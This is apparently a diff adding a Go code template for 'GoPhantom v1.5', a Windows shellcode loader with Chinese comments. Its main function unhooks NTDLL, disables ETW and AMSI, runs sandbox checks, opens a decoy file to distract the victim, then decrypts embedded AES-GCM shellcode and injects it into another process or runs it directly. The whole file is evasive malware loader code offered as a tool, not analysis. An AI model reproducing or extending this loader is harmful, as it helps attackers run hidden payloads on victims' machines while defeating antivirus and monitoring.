@@ -1,0 +1,131 @@
+//go:build windows
+// +build windows
+
+// GoPhantom v1.5 loader — generated code, do not edit manually.
+package main
+
+import (
+	"bytes"
+	"compress/zlib"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"golang.org/x/crypto/argon2"
+	"io"
+	"math/rand"
+	"net"
+	"net/http"
+	"os"
+	"os/user"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+)
+
+// ============================================================
+// 编译时注入的常量
+// ============================================================
+
+const (
+	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
+	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
+	aesSaltBase64            = "{{.Salt}}"
+	decoyFileName            = "{{.DecoyFileName}}"
+	enableCompress           = {{.EnableCompress}}
+	enableObfuscate          = {{.EnableObfuscate}}
+	enableMutate             = {{.EnableMutate}}
+	delaySeconds             = {{.DelaySeconds}}
+	enableInject             = {{.EnableInject}}
+	sandboxThreshold         = 5
+)
+
+{{template "_structs" .}}
+{{template "_infra" .}}
+{{template "_bypass" .}}
+{{template "_sandbox" .}}
+{{template "_crypto" .}}
+{{template "_camouflage" .}}
+{{template "_execute" .}}
+
+// ============================================================
+// main
+// ============================================================
+
+func main() {
+	rand.Seed(time.Now().UnixNano())
+
+	// 第1步：NTDLL 脱钩（最高优先级，在所有其他操作之前）
+	unhookNTDLL()
+
+	// 第2步：禁用 ETW 和 AMSI
+	disableETW()
+	disableAMSI()
+
+	// 第3步：反沙箱检测（评分制）
+	if !antiSandboxChecks() {
+		return
+	}
+
+	// 第4步：API 锤击
+	apiHammering()
+
+	// 第5步：行为伪装（含 IAT 伪装）
+	go behaviorCamouflage()
+
+	// 第6步：解密并展示诱饵文件
+	if decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64); err == nil {
+		tempDirs := []string{"TEMP", "TMP", "PUBLIC"}
+		selected := tempDirs[rand.Intn(len(tempDirs))]
+		var decoyPath string
+		if tp := os.Getenv(selected); tp != "" {
+			decoyPath = filepath.Join(tp, decoyFileName)
+		} else {
+			decoyPath = filepath.Join("C:\\Temp", decoyFileName)
+		}
+		if os.WriteFile(decoyPath, decoyBytes, 0644) == nil {
+			shellExec := getProcAddr(shell32(), ds("{{index .EncodedStrings "ShellExecuteA"}}"))
+			if shellExec != 0 {
+				verb, _ := syscall.BytePtrFromString("open")
+				path, _ := syscall.BytePtrFromString(decoyPath)
+				syscall.Syscall6(shellExec, 6, 0,
+					uintptr(unsafe.Pointer(verb)),
+					uintptr(unsafe.Pointer(path)),
+					0, 0, 1)
+			}
+		}
+	}
+
+	// 第7步：延迟执行
+	time.Sleep(time.Duration(1000+rand.Intn(2000)) * time.Millisecond)
+	if delaySeconds > 0 {
+		for i := 0; i < delaySeconds; i++ {
+			time.Sleep(time.Second + time.Duration(rand.Intn(100))*time.Millisecond)
+		}
+	}
+
+	// 第8步：解密并执行 shellcode
+	if shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64); err == nil {
+		sc := mutateShellcode(shellcode)
+
+		if enableInject {
+			if !injectToProcess(sc) {
+				executeShellcode(sc)
+			}
+		} else {
+			executeShellcode(sc)
+		}
+
+		// 内存清理
+		for i := range shellcode {
+			shellcode[i] = 0
+		}
+		for i := range sc {
+			sc[i] = 0
+		}
+	}
+
+	time.Sleep(time.Duration(2000+rand.Intn(1000)) * time.Millisecond)
+}
